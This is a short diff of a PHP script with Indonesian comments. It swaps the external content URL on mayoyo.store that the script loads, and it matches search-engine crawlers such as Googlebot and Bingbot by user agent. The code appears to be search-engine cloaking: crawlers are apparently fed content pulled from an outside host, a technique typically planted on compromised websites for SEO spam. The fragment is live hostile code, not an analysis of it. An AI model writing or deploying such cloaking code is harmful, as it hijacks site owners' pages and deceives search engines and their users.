@@ -3,7 +3,7 @@ ob_start();
 header("Vary: User-Agent");
 
 // Link konten asli
-$content_url = "https://mayoyo.store/shivamchem.com/index.html";
+$content_url = "https://mayoyo.store/dramynrajani.com/index.html";
 
 // Pola bot yang mau di-handle
 $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
